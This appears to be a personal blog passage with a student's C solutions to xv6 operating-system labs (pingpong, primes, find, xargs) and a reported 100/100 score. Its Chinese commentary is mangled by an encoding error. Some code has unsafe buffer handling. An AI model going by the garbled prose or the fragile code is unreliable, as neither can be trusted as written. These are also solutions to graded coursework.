class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h4><p>åˆ©ç”¨pipeå®Œæˆçˆ¶å­è¿›ç¨‹ä¹‹é—´åŒå‘é€šä¿¡ï¼Œåˆšå¼€å§‹æ²¡ç†è§£é€pipe,åªç”¨äº†ä¸€ä¸ªç®¡é“ï¼Œå‘ç°æ€ä¹ˆéƒ½ä¸å¯¹ï¼Œçœ‹äº†åˆ«äººçš„ä»£ç æ‰æç„¶å¤§é›¾ï¼Œpipeåªèƒ½å®Œæˆå•å‘é€šä¿¡ï¼ŒåŒå‘è‚¯å®šå¾—è¦ä¸¤ä¸ªç®¡é“å•Š,ä¸è¿‡æˆ‘é”™è¯¯é‚£ä¸€ç‰ˆéª—è¿‡äº†labæ£€æŸ¥ç¨‹åºï¼Œä¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_to_child[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> p_to_parent[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    pipe(p_to_child);</span><br><span class="line">    pipe(p_to_parent);</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;fork fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="keyword">int</span> ret=read(p_to_child[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received ping\n&quot;</span>,getpid());</span><br><span class="line">        ret=write(p_to_parent[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        close(p_to_child[rd]);</span><br><span class="line">        close(p_to_parent[wt]);</span><br><span class="line">        <span class="keyword">int</span> ret=write(p_to_child[wt],<span class="string">&quot;1&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ret=read(p_to_parent[rd],buf,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;read fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%d: received pong\n&quot;</span>,getpid());</span><br><span class="line">        close(p_to_child[wt]);</span><br><span class="line">        close(p_to_parent[rd]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h4><p>è¿™ä¸ªç¨‹åºè¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œè¦æ±‚åˆ©ç”¨forkå’Œç®¡é“å®Œæˆå¯¹ç´ æ•°çš„ç­›é€‰ï¼Œç†è®ºå¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220807185230278.png" alt="image-20220807185230278"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rd 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wt 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> p_rd,<span class="keyword">int</span> c_wt)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    read(p_rd,&amp;first_num,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;prime %d\n&quot;</span>,first_num);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">while</span>(read(p_rd,&amp;num,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(num%first_num!=<span class="number">0</span>)&#123;</span><br><span class="line">            temp++;</span><br><span class="line">            write(c_wt,&amp;num,<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> c[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pipe(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">35</span>;i++)&#123;</span><br><span class="line">        write(p[wt],&amp;i,<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            pipe(c);</span><br><span class="line">            close(p[wt]);</span><br><span class="line">            <span class="keyword">int</span> ret=fun(p[rd],c[wt]);</span><br><span class="line">            close(p[rd]);</span><br><span class="line">            <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p[rd]=c[rd];</span><br><span class="line">            p[wt]=c[wt];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[wt])&#123;</span><br><span class="line">                close(p[wt]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[rd])&#123;</span><br><span class="line">                close(p[rd]);</span><br><span class="line">            &#125;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>è¿™ä¸ªè°ƒäº†æˆ‘åŠä¸ªæ—©ä¸ŠğŸ¤¦â€â™€ï¸ï¼Œé¦–å…ˆæ˜¯ç¨‹åºé€€å‡ºæ—¶æŠ¥é”™ï¼Œæˆ‘è¯•äº†åŠå¤©æ‰å‘ç°xv6ç³»ç»Ÿçš„mainå‡½æ•°åªèƒ½ä»¥exit()é€€å‡ºï¼Œå…¶æ¬¡æ˜¯æµ‹è¯•ç¨‹åºè€æ˜¯è¿‡ä¸å»ï¼Œå¤šæ–¹è°ƒè¯•åå‘ç°è‡ªå·±çš„ä¸€å—é€»è¾‘å†™çš„æœ‰æ˜æ˜¾é—®é¢˜ï¼Œå‘œå‘œå‘œè¿™æ˜æ˜åªæ˜¯ä¸­ç­‰éš¾åº¦ï¼Œä»£ç èƒ½åŠ›è¿˜æ˜¯å¤ªèœäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *file_path,<span class="keyword">char</span> *res)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    memmove(buf,file_path,<span class="built_in">strlen</span>(file_path));</span><br><span class="line">    <span class="keyword">int</span> fd=open(file_path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (read(fd,&amp;de,<span class="keyword">sizeof</span>(de))==<span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">        <span class="keyword">if</span>(de.inum==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;.&quot;</span>)||!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">        memmove(p, de.name, DIRSIZ);</span><br><span class="line">        <span class="keyword">if</span>(stat(buf,&amp;st)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;stat() fail filename :%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(st.type==T_FILE)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,res))&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (st.type==T_DIR)</span><br><span class="line">        &#123;</span><br><span class="line">            p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            find(buf,res);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">         memmove(buf,file_path,<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;parameter fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memmove(buf,argv[<span class="number">1</span>],DIRSIZ);</span><br><span class="line">    p=buf+<span class="built_in">strlen</span>(buf)<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p!=<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        p++;</span><br><span class="line">        *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    find(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><p>ä¸»è¦éº»çƒ¦çš„ç‚¹åœ¨å¯¹å­—ç¬¦ä¸²çš„å¤„ç†ä¸Šï¼Œæˆ‘çœ‹åˆ«äººçš„åšå®¢åˆ©ç”¨äº†æœ‰é™è‡ªåŠ¨æœºï¼Œå˜¿å˜¿ï¼Œä¸ä¼šè¿™ä¸ªé«˜ç«¯çš„ä¸œè¥¿ï¼Œæˆ‘çš„è§£å†³åŠæ³•æ˜¯å¯¹å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œæ ‡å‡†åŒ–ï¼Œç„¶åå°±åˆ©äºåé¢çš„å­—ç¬¦ä¸²å¤„ç†äº†(æ— è„‘åšæ³•å±äº)ã€‚è¿˜æœ‰æˆ‘çš„ä»£ç èƒ½åŠ›çœŸå¾—å¼±ï¼Œè¿™ç‚¹ä»£ç èŠ±äº†æˆ‘ä¸¤ä¸ªå°æ—¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line_length</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> line_length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[line_length]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> line_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> line_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;argv fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> size=read(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">char</span> parm_buf[size+<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(parm_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm_buf));</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size; i++,cur++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            cur++;</span><br><span class="line">            parm_buf[cur]=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            line_num++;</span><br><span class="line">            cur++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parm_buf[cur]=buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[size<span class="number">-1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;line_num;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> add_parm_num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_cur=cur;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[temp_cur]!=<span class="string">&#x27;\n&#x27;</span>;temp_cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[temp_cur]==<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                add_parm_num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *parm[add_parm_num+argc];</span><br><span class="line">        <span class="built_in">memset</span>(parm,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm));</span><br><span class="line">        <span class="keyword">int</span> parm_cur=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;argc;j++,parm_cur++)&#123;</span><br><span class="line">            parm[parm_cur]=argv[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[cur]!=<span class="string">&#x27;\n&#x27;</span>;cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[cur]==<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                parm[parm_cur]=&amp;parm_buf[cur+<span class="number">1</span>];</span><br><span class="line">                parm_cur++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur++;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            exec(parm[<span class="number">0</span>],parm);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;exec fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot; wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æœ€ålabå¾—åˆ†"><a href="#æœ€ålabå¾—åˆ†" class="headerlink" title="æœ€ålabå¾—åˆ†"></a>æœ€ålabå¾—åˆ†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 100/100</span><br></pre></td></tr></table></figure>

<h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸Šç¼–ç¨‹å¾ˆå¥‡å¦™ä¹Ÿå¾ˆæœ‰æ„æ€ã€‚</p>
<h3 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2: system calls"></a>Lab2: system calls</h3><p>è¿™ä¸ªå®éªŒä¸»è¦æ˜¯ä¸ºäº†ç†è§£ç³»ç»Ÿè°ƒç”¨çš„å·¥ä½œæµç¨‹ï¼Œå¹¶ä¸ºxv6å¢åŠ ä¸€äº›æ–°çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>
